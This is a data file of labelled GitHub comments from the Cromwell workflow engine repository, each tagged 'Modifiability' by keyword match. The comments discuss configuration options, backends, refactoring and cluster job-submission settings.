cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:951); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.executeOrRecover(ConfigAsyncJobExecutionActor.scala:200); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.core.retry.Retry$$anonfun$withRetry$1.$anonfun$applyOrElse$3(Retry.scala:45); 	at akka.pattern.FutureTimeoutSupport.liftedTree1$1(FutureTimeoutSupport.scala:26); 	at akka.pattern.FutureTimeoutSupport.$anonfun$after$1(FutureTimeoutSupport.scala:26); 	at akka.actor.Scheduler$$anon$4.run(Scheduler.scala:205); 	at akka.dispatch.TaskInvoca,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211:2845,config,config,2845,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4725#issuecomment-472514211,1,['config'],['config']
Modifiability,"Actually it seems that the config I was using already had that line in it, set to 16. I've reduced the concurrent-job-limit to 8, and I'll see how it goes",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-434295499:27,config,config,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-434295499,1,['config'],['config']
Modifiability,"Actually now I'm realizing that the data retrieved by this API is not really of the ""meta"" variety, so it's possible this might continue to work in the PBE world as is. You might want to leave this open, the worst that could happen is it gets disabled in a refactoring. But PBE is probably a couple of months away, so if you'd like to use this functionality before then you'll still need to make a 0.19_hotfix version of this PR as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/830#issuecomment-219185802:257,refactor,refactoring,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/830#issuecomment-219185802,1,['refactor'],['refactoring']
Modifiability,Actually the link I posted (also it's one of the key examples in the Akka docs) might not be so useful as it looks like a lot of the places we're using ConfigFactory.load don't have access to the main actor system,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141:152,Config,ConfigFactory,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-231745141,1,['Config'],['ConfigFactory']
Modifiability,"Actually the more I'm digging into this I take it all back. For now. The `zones` field in the Cromwell code doesn't seem to be actually used anywhere except for tests. . Thining about it now I have a recollection that this was part of the cloud formation setup for the batch configuration. I'll need to dig into this unless @wleepang swoops in with some wizardly knowledge. BTW, it could be (and would make sense) that `~/.aws/conf` file is getting picked up via one of the Amazon libraries Cromwell is using. But I see no evidence that it's being directly used by Cromwell itself.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493269281:275,config,configuration,275,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493269281,1,['config'],['configuration']
Modifiability,"Added a section to the `Google.md` docs. Also refactored the config handling a little to allow for a default value for the docker-image, and to allow for running without an NGC.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3950#issuecomment-410024401:46,refactor,refactored,46,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3950#issuecomment-410024401,2,"['config', 'refactor']","['config', 'refactored']"
Modifiability,Added some tests. @geoffjentry I think these unit tests are comprehensive enough without (re-)testing that Cromwell wires variables into engine functions correctly in centaur. Hope you agree?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314415451:122,variab,variables,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2422#issuecomment-314415451,1,['variab'],['variables']
Modifiability,"After discussing internally, we unfortunately can't add this code or support the general direction of proxy compatibility. Docker lookups and call caching are pretty sensitive and involved and we're looking to keep the configuration surface area to an absolute minimum.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1545803504:219,config,configuration,219,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7114#issuecomment-1545803504,1,['config'],['configuration']
Modifiability,"After discussion, we will resurrect the config named [`backend.backendsAllowed`](https://github.com/broadinstitute/cromwell/commit/9faa735df0039652b124ecc0b7e7e5ffa62fd0ff#diff-29d3e359e75a05cf433ad3abe5f194a8L85), [`backend.allowedBackends`](https://github.com/broadinstitute/cromwell/commit/9faa735df0039652b124ecc0b7e7e5ffa62fd0ff#diff-59ba4e6691e949675b4ccaa65a906e1dL22), or maybe just `backend.allowed` to match the style of the config named `backend.default`. Whatever the name, only backends found in this explicit list will be loaded. By default, the reference list will only contain ""Local"". Thus, after upgrading, cromwell will default back to running _only_ the Local backend, until admins/users re-enable the other backends by overriding the list.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288155798:40,config,config,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2069#issuecomment-288155798,2,['config'],['config']
Modifiability,"Again, may be discussed elsewhere, but I'd love to see more tests, even commented out, or auto-skipped if a JES config doesn't exist locally. I'm not going to penalize this story though, and will leave it to the tech debt building up in DSDEEPB-828.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124131947:112,config,config,112,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124131947,1,['config'],['config']
Modifiability,"Ah I see your point now, and I agree that would be a separate ticket to enhance all the backends equally. :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151877210:72,enhance,enhance,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/249#issuecomment-151877210,1,['enhance'],['enhance']
Modifiability,"Ah ok, I'm not familiar with how to add configuration options. Depending on how involved a process it is / if there is some example from an earlier pull request I could follow, I would be happy to give it a shot. If not, I'm also ok with shelving this for now and just using an ad-hoc build in the meantime.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-547681039:40,config,configuration,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5250#issuecomment-547681039,1,['config'],['configuration']
Modifiability,Ah! you mean evolve the timing diagram logic to group execution events?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4162#issuecomment-425201914:13,evolve,evolve,13,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4162#issuecomment-425201914,1,['evolve'],['evolve']
Modifiability,"Ah, I had `hasing-strategy` instead of `hashing-strategy` in my config.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861:64,config,config,64,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7108#issuecomment-1489453861,1,['config'],['config']
Modifiability,"Ah, I see. Just a guess, but are you sure your S3 URLs (or more likely your S3 bucket in the configuration file) are in the right format? `s3://s3.amazonaws.com/concr-genomics-results/cromwell-execution/wf_hello/b7e4cdce-ff14-4509-aec3-b226ed31043c/call-hello/hello-rc.txt` doesn't look valid to me. It should be more like `s3://concr-genomics-results`. Alternatively, maybe the AWS Batch role doesn't have read access to the S3 bucket? The Cromwell server and the Batch instances are different",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016934:93,config,configuration,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016934,1,['config'],['configuration']
Modifiability,"Ah, good call! I found the documentation for it: https://cromwell.readthedocs.io/en/develop/Configuring/#io. I'll have to test if it applies to AWS. Hopefully it does",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436887998:92,Config,Configuring,92,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436887998,1,['Config'],['Configuring']
Modifiability,"Aha ... I think I found what you need (**NB** I'm not in a position to actually test these theories right now, YMMV and all that). In your **Cromwell** config, look at the field `aws.region`",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493272139:152,config,config,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4974#issuecomment-493272139,1,['config'],['config']
Modifiability,"Aha. So maybe we can just default in our own Noop DSN to silence the error. ToL: The lack-of-a-DSN-message is also [Logback adjacent](https://docs.sentry.io/clients/java/modules/logback/#usage). Someday I'll figure out how the hell to use logback/Joran. On first glance it looks a lot like HOCON's embedded default `application.conf` that can be overriden via `-Dconfig.file=…` except one is supposed to use [`-Dlogback.configurationFile=…`](https://logback.qos.ch/manual/configuration.html#configFileProperty). But while I ""get"" HOCON's mechanics I do not yet ""get"" best practices for logback [overrides/includes](https://stackoverflow.com/a/23737143/3320205).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3620#issuecomment-389034690:420,config,configurationFile,420,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3620#issuecomment-389034690,3,['config'],"['configFileProperty', 'configuration', 'configurationFile']"
Modifiability,"Allows WDL code like:. ```; Array[Int] indexing_list = seq(20000). scatter (idx in indexing_list) {; call FileSpam { input: index = idx, width = 5 }; }; ```. it's also annoying that you can't just put the `seq(5)` inline and remove the intermediate `indexing_list` variable, but that's a separate, existing ticket",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/968#issuecomment-224376801:265,variab,variable,265,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/968#issuecomment-224376801,1,['variab'],['variable']
Modifiability,"Alright so if I have a sra stanza in the `engine` portion of the config I get the error from above. . If I remove it and only keep the sra stanza in the top level filesystems part of the config and an sra stanza in the backend filesystems portion of the config I then get the following error:. ```; [2020-08-24 17:31:17,07] [info] WorkflowManagerActor Workflow fbc40d55-a668-4fd8-982c-e53333ad04f5 failed (during ExecutingWorkflowState): java.lang.RuntimeException: Failed to evaluate 'tumor_only_reads_size' (reason 1 of 1): Evaluating ceil(size(tumor_reads, ""GB"")) failed: java.lang.IllegalArgumentException: Could not build the path ""sra://SRR2841273/SRR2841273"". It may refer to a filesystem not supported by this instance of Cromwell. Supported filesystems are: Google Cloud Storage, HTTP, LinuxFileSystem. Failures: ; Google Cloud Storage: Cloud Storage URIs must have 'gs' scheme: sra://SRR2841273/SRR2841273 (IllegalArgumentException); HTTP: sra://SRR2841273/SRR2841273 does not have an http or https scheme (IllegalArgumentException); LinuxFileSystem: Cannot build a local path from sra://SRR2841273/SRR2841273 (RuntimeException); Please refer to the documentation for more information on how to configure filesystems: http://cromwell.readthedocs.io/en/develop/backends/HPC/#filesystems; 	at cromwell.engine.workflow.lifecycle.execution.keys.ExpressionKey.processRunnable(ExpressionKey.scala:29); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.$anonfun$startRunnableNodes$7(WorkflowExecutionActor.scala:538); 	at cats.instances.ListInstances$$anon$1.$anonfun$traverse$2(list.scala:74); 	at cats.instances.ListInstances$$anon$1.loop$2(list.scala:64); 	at cats.instances.ListInstances$$anon$1.$anonfun$foldRight$1(list.scala:64); 	at cats.Eval$.loop$1(Eval.scala:338); 	at cats.Eval$.cats$Eval$$evaluate(Eval.scala:368); 	at cats.Eval$Defer.value(Eval.scala:257); 	at cats.instances.ListInstances$$anon$1.traverse(list.scala:73); 	at cats.instances.ListInstances$$anon$",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679437852:65,config,config,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679437852,3,['config'],['config']
Modifiability,"Also of note - at the time (probably) we had an ""SGE backend"". Now we have the config backend. So we could do the same with e.g. LSF. Outside of Broad we probably have more LSF users than SGE users. Inside Broad it'd be nearly 100% SGE. OTOH I don't know how well our SGE stuff works with UGER so perhaps not.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324096040:79,config,config,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1180#issuecomment-324096040,1,['config'],['config']
Modifiability,"Also worth noting that `/mnt/cromwell_io_mountpoint` is not to be taken literally. . It should be a configurable option to Cromwell server, but not a runtime attribute. . Proposed name ""CROMWELL_HOST_ROOT"" but open to better suggestion.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-399127437:100,config,configurable,100,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3744#issuecomment-399127437,1,['config'],['configurable']
Modifiability,"Also, please make sure wherever you specify the runtime-attributes; ""docker"", ""memory"" etc, you include ""disks"" also. Example:; ""default_runtime_attributes"": {; ""docker"": ""ubuntu:latest"",; ""memory"": ""21G"",; ""disks"" : ""/mnt/efs 3 EFS""; }; The size,3 , in this case does not matter. It gets ignored. On Fri, Feb 14, 2020 at 9:45 AM Vanaja Narayanaswamy <vanajasmy@gmail.com>; wrote:. > Can you upload the complete stack trace from the cromwell-log?; >; > On Fri, Feb 14, 2020 at 9:29 AM pjongeneel <notifications@github.com>; > wrote:; >; >> I have /mnt/efs on both batch nodes and cromwell server which is the; >> mounted EFS.; >>; >> Then; >> backend {; >> // this configures the AWS Batch Backend for Cromwell; >> default = ""AWSBATCH""; >> providers {; >> AWSBATCH {; >> actor-factory =; >> ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; >> config {; >> root = ""/mnt/efs/cromwell_execution""; >> auth = ""default""; >>; >> numSubmitAttempts = 3; >> numCreateDefinitionAttempts = 3; >>; >> default-runtime-attributes {; >> queueArn: ""${BatchQueue}""; >> }; >>; >> filesystems {; >> local { auth = ""default"" }; >> }; >> }; >> }; >>; >> }; >> }; >>; >> And I always get this error:; >> ERROR - AwsBatchAsyncBackendJobExecutionActor; >> [UUID(8512304b)bioinfx.testjob:NA:1]: Error attempting to Execute; >> java.util.NoSuchElementException: None.get; >>; >> —; >> You are receiving this because you were mentioned.; >> Reply to this email directly, view it on GitHub; >> <https://github.com/broadinstitute/cromwell/pull/5070?email_source=notifications&email_token=ALILATR2AVXQXLFRQKER6W3RC3IIXA5CNFSM4IBORPI2YY3PNVWWK3TUL52HS4DFVREXG43VMVBW63LNMVXHJKTDN5WW2ZLOORPWSZGOELZZF7A#issuecomment-586388220>,; >> or unsubscribe; >> <https://github.com/notifications/unsubscribe-auth/ALILATWPGUN66MUEOCVPYULRC3IIXANCNFSM4IBORPIQ>; >> .; >>; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147:665,config,configures,665,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5070#issuecomment-586416147,2,['config'],"['config', 'configures']"
Modifiability,"Although, that mysql example does look wrong (but shouldn't affect/override real config file values)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110122:81,config,config,81,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2217#issuecomment-298110122,1,['config'],['config']
Modifiability,Am just seeing the latest talk on the bug saying that this should be a config option. I will have to re-work this.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3446#issuecomment-375746261:71,config,config,71,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3446#issuecomment-375746261,1,['config'],['config']
Modifiability,Am wondering if these limits should be specified in the conf file. They should be generous and static but I could envision a scenario where one would want to override read_json or something. In that scenario a config change would be nice to have available,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-303433107:210,config,config,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2291#issuecomment-303433107,1,['config'],['config']
Modifiability,"Among other warts labeled as ""TODO: PBE:"", there are now two directories serving the package `cromwell.service`:; - [`services/src/main/scala/cromwell/services`](https://github.com/broadinstitute/cromwell/tree/ks_jes_return_of_the_metadata/services/src/main/scala/cromwell/services); - [`. engine/src/main/scala/cromwell/services`](https://github.com/broadinstitute/cromwell/tree/ks_jes_return_of_the_metadata/engine/src/main/scala/cromwell/services). The latter directory are services that still access the engine. Some engineering/refactoring will be needed if we want them moved to the ""services"" sub-project, but I wasn't sure where to draw the line on changes for this PR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/883#issuecomment-221376763:533,refactor,refactoring,533,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/883#issuecomment-221376763,1,['refactor'],['refactoring']
Modifiability,"An example of this is submit a workflow with a ""user-with-refresh"" config and forget the ""refresh_token"" workflow option",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1079#issuecomment-228875121:67,config,config,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1079#issuecomment-228875121,1,['config'],['config']
Modifiability,"An update...; It looks like the performance of `sync` — run on command line entirely outside the context of cromwell — that we see on our box that happens to be running cromwell is atypical. Other machines in our compute cluster with same OS and similar amounts of memory execute `sync` in milliseconds, the cromwell server box takes up to a second. we're still trying to identify the cause; there are some configuration differences in the machines, specifically the number, type and state of the mounted filesystems, as well as differences in the applications running in background, but as it stands I'm happy to call this as not a cromwell performance issue, so much as a potential performance issue running cromwell in certain environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285258989:407,config,configuration,407,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2057#issuecomment-285258989,1,['config'],['configuration']
Modifiability,"And here is the config:; ```hocon; sbatch \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /cluster-shared-filesystem,${cwd}:${docker_cwd} docker://${docker} sh ${script}; rc=$?; if [ ! -f ${cwd}/execution/rc ]; then; echo ""$rc"" > ${cwd}/execution/rc; fi'; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627148558:16,config,config,16,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627148558,1,['config'],['config']
Modifiability,"Another option would be a cromwell speicifc thing. With cromwell, you could reserve a variable at the level of the workflow called `String cromwell_workflow_id`. When cromwell is resolving inputs, it basically would set this to the value of the current cromwell id. We would not need to change syntax, just document what vairable names are reserved for cromwell.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328292551:86,variab,variable,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1575#issuecomment-328292551,1,['variab'],['variable']
Modifiability,"Answered on slack but for posterity:. According to the original PR, the `sra` filesystem should be referenced in the root `filesystems` stanza, not the one inside the PAPI filesystem. You might also need to add it inside the PAPI filesystem config too to enable it, but most of the config mentioned here (`class`, `docker-image`, `ngc`) looks like it belongs at the root level.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679354011:241,config,config,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-679354011,2,['config'],['config']
Modifiability,"Apart from some requests for newlines which I don't understand (not saying I disagree, I just don't understand what's being asked for) and some enhancer class methods, this seems a rebase away from being mergeable. It would be nice to get this in today if possible, there's a lot of good stuff here that I know multiple people (Alex, Chris, me) would like to get on develop/master ASAP, preferably before the multi-team demo.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/135#issuecomment-132562881:144,enhance,enhancer,144,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/135#issuecomment-132562881,1,['enhance'],['enhancer']
Modifiability,"Approved. @mcovarr my name is only attached here because I enabled the PullApprove plugin. Chris turned off the ""required"" piece, so you should still be able to merge. Once a .pullapprove.yml file is in place, it will have the correct people who should actually be doing the approvals.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-193473786:83,plugin,plugin,83,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/468#issuecomment-193473786,1,['plugin'],['plugin']
Modifiability,"Are we using single inserts or batch inserts when writing to the DB? That can cause huge performance gains due the reduction in chatter. > On Dec 27, 2016, at 1:08 AM, Jeff Gentry <notifications@github.com> wrote:; > ; > While benchmarking some performance enhancements I've been playing with I kept noticing that no matter how fast I could get things eventually performance would drop back down to baseline levels from develop. I traced it down to the WriteMetadataActor, specifically it appears that writing boatloads of individual events (not atypical under load) can cause a lot of problems (not particularly surprising, but ...); > ; > It seems like some sort of batching/work pulling scheme could work wonders here although presumably it'd then come at the cost of memory (to buffer the unwritten values). That's just one thought, not a prescription; > ; > —; > You are receiving this because you are subscribed to this thread.; > Reply to this email directly, view it on GitHub, or mute the thread.; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269315957:257,enhance,enhancements,257,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1810#issuecomment-269315957,1,['enhance'],['enhancements']
Modifiability,Argh. The [shellcheck plugin](https://plugins.jetbrains.com/plugin/10195-shellcheck) is not highlighting all warnings as I expected. 🤦‍♂. Will clean up the warnings using the brew'ed shellcheck.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4930#issuecomment-490131055:22,plugin,plugin,22,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4930#issuecomment-490131055,3,['plugin'],"['plugin', 'plugins']"
Modifiability,"As a **user running workflows and setting up configs**, I want **Cromwell to (fail nicely?) when I reference a pluggable backend class that's not on the classpath**, so that I can **(still run my workflow? get a nice error message?)**. @geoffjentry ; - Effort: **Small?**; - Risk: **Small**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1683#issuecomment-328531953:45,config,configs,45,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1683#issuecomment-328531953,1,['config'],['configs']
Modifiability,"As a **user running workflows**, I want **Cromwell to use a default job count limit if I have not configured a `concurrent-job-limit`**, so that **the backend defaults to a sensible job limit**.; * Effort: Small; * Risk: Small; * Business Value: Small to Medium",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911:98,config,configured,98,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2548#issuecomment-332626911,1,['config'],['configured']
Modifiability,"As a **user running workflows**, I want to **override runtime variables**, so that I can **change hardcoded runtime attributes when someone else wrote the method**.; - Effort: **Small**; - Risk: **Small**; - Carefully vet a good solution; - Avoid breaking changes; - Business value: **Small to Medium**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-324084418:62,variab,variables,62,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1210#issuecomment-324084418,1,['variab'],['variables']
Modifiability,"As a short-term workaround you might define different config backends for each Docker configuration you want to support, but that wouldn't scale well if you have a lot of different configurations. Also that requires changes to your conf file to match your WDL which is kind of gross. Do you have any specific suggestions how you'd want this to work?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2494#issuecomment-326077265:54,config,config,54,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2494#issuecomment-326077265,3,['config'],"['config', 'configuration', 'configurations']"
Modifiability,"As explained [here](https://cromwell.readthedocs.io/en/stable/filesystems/FileTransferProtocol/#instance-configuration), you will need an ftp stanza inside your backend or engine filesystem stanza such as this (look at the example as well):; ```; ftp {; # optional; auth {; username = ""username""; password = ""password""; # Optional; account = ""account""; }; }; ```; I suppose you might leave the fto stanza empty without the optional parts, but maybe you still need it nevertheless. Remember also that the engine filesystem stanza is for Cromwell to be able to access the files with functions such as `read_lines()/read_map()/read_tsv()/read_json()/write_lines()/write_map()/write_tsv()/write_json()/etc.`, while the backend filesystem stanza is for the tasks to be able to access and localize files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392:105,config,configuration,105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6237#issuecomment-810693392,1,['config'],['configuration']
Modifiability,"As far as I can tell, the [refreshed branch](https://github.com/broadinstitute/cromwell/pull/5291) has passed tests for this PR. You're right, the test suite doesn't (as far as I can tell) run Aws-tagged unit tests (the Unit testing config doesn't include any AWS connectivity). Question: Does the new test actually depend on connecting to external AWS resources? ; * If so, it probably would fail in our unit test runs (so not running would be correct!). ; * If not (or if you can mock things out so that it doesn't), you can probably remove the tag to see it run during our regular unit testing. Whichever way you answer the above question is fine, just let us know one way or the other and I'd be happy to give you a thumb. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-568504321:233,config,config,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5216#issuecomment-568504321,1,['config'],['config']
Modifiability,"As tech debt, I maybe would like to see things like `unwrapOutputValues` broken into utility functions. Not going to hold this PR up any longer figuring out this exact refactoring, but looking at current code I'm picturing something along the starting lines of:. ``` scala; // Sort of like Future.sequence, but with; // unwrapOutputValues's Failure(new Throwable(messages.mkString)); def sequenceMessages[T](in: Seq[Try[T]]): Try[T]. // If there are any failures, uses sequenceMessages to create the Failure; def unwrapValues[K,V](in: Map[K,Try[V]]): Try[Map[K,V]]; ```. :+1: For merging for the current code @cjllanwarne",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124156449:168,refactor,refactoring,168,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/112#issuecomment-124156449,1,['refactor'],['refactoring']
Modifiability,"Assuming that putting that in the runtime {cpuPlatform: ""Intel Cascade Lake""} setting in the Cromwell conf file counts as ""in the configuration"", then yes. If we have to hand edit every single one of our WDL task files to put that in a runtime block, not I haven't tried that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2254634598:130,config,configuration,130,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7474#issuecomment-2254634598,1,['config'],['configuration']
Modifiability,At a workflow level this has been prioritised as #908. For backends I believe this should be done on a case-by-case basis by the backend owner. There'll always be something that doesn't make sense as a config option so a set of more focused tickets will be much easier to prioritise and then handle.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/724#issuecomment-254304221:202,config,config,202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/724#issuecomment-254304221,1,['config'],['config']
Modifiability,"At this time, changing the-user-id-running-_inside_-the-docker-container from `root`/`0` to the-user-id-running-_outside_-the-container would be a breaking change. There are probably hundreds of docker images running on Cromwell, and some unknown fraction of them may be expecting to run as docker's default root. Without more discussion with our wider user base we cannot make this change to the default user id just yet. However, as a workaround for those that would like to harden their environments, one can change the default docker user from root to `$EUID` by changing their config:. ```hocon; backend.providers.Local.config {; runtime-attributes = """"""; String? docker; String docker_user = ""$EUID""; """"""; }; ```; (tested on 29-242b111)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2658#issuecomment-332269515:582,config,config,582,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2658#issuecomment-332269515,2,['config'],['config']
